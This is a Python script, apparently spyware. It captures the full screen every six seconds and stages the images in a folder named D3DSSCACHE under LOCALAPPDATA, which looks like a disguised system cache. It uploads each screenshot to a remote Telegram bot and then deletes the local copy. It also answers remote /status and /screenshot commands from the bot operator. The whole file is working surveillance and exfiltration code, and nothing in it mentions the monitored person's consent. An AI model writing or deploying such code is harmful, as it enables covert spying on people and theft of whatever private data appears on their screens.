import time as t
import requests
import datetime
import os
from PIL import ImageGrab

# Telegram Bot Configuration
BOT_API_TOKEN = "YOUR-BOT-TOKEN"  # Your bot token
USER_ID = "YOUR-USER-ID"  # Your Telegram chat/user ID
SCREENSHOT_INTERVAL = 6  # Screenshot interval in seconds (10 screenshots per minute)

# Screenshot storage
screenshot_counter = 0
consecutive_messages = 0
last_status_message = ""

# Define the path for the D3DSSCACHE directory
D3DSSCACHE_PATH = os.path.join(os.getenv('LOCALAPPDATA'), 'D3DSSCACHE')

# Create the D3DSSCACHE directory if it doesn't exist
if not os.path.exists(D3DSSCACHE_PATH):
    os.makedirs(D3DSSCACHE_PATH)

# Function to send message to Telegram
def send_telegram_message(body):
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": body
        }
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Failed to send message. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

# Function to take and send a screenshot
def take_screenshot():
    global screenshot_counter
    try:
        screenshot_counter += 1
        screenshot = ImageGrab.grab()  # Capture the entire screen
        screenshot_path = os.path.join(D3DSSCACHE_PATH, f"screenshot_{screenshot_counter}.png")
        screenshot.save(screenshot_path)  # Save the screenshot to a file
        
        # Send the screenshot to Telegram
        with open(screenshot_path, 'rb') as f:
            url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendPhoto"
            payload = {
                "chat_id": USER_ID
            }
            files = {
                'photo': f
            }
            response = requests.post(url, data=payload, files=files)
            if response.status_code != 200:
                print(f"Failed to send screenshot. Status Code: {response.status_code}")
        
        # Clean up the screenshot file after sending
        os.remove(screenshot_path)
        print(f"Screenshot {screenshot_counter} sent successfully.")
    except Exception as e:
        print(f"Error taking/sending screenshot: {e}")

# Function to handle Telegram updates
def handle_telegram_updates():
    global consecutive_messages, last_status_message
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/getUpdates"
        response = requests.get(url)
        updates = response.json()
        
        for update in updates['result']:
            if 'message' in update and 'text' in update['message']:
                text = update['message']['text']
                if text == '/status':
                    if consecutive_messages < 1 or last_status_message != "STATUS OK: Screenshot Capturer Running":
                        send_telegram_message("STATUS OK: Screenshot Capturer Running")
                        last_status_message = "STATUS OK: Screenshot Capturer Running"
                        consecutive_messages += 1
                        print("Status command received and processed.")
                    else:
                        print("Status command received but not processed to avoid consecutive duplicates.")
                elif text == '/screenshot':
                    take_screenshot()
                    print("Manual screenshot command received and processed.")
    except Exception as e:
        print(f"Error handling Telegram updates: {e}")

print("Screenshot capturer started.")

# Main loop
while True:
    try:
        # Take a screenshot at the specified interval
        take_screenshot()
        
        # Handle Telegram updates
        handle_telegram_updates()
        
        # Sleep for the specified interval
        t.sleep(SCREENSHOT_INTERVAL)
    except KeyboardInterrupt:
        print("Screenshot capturer stopped by user.")
        break
    except Exception as e:
        print(f"Error in main loop: {e}")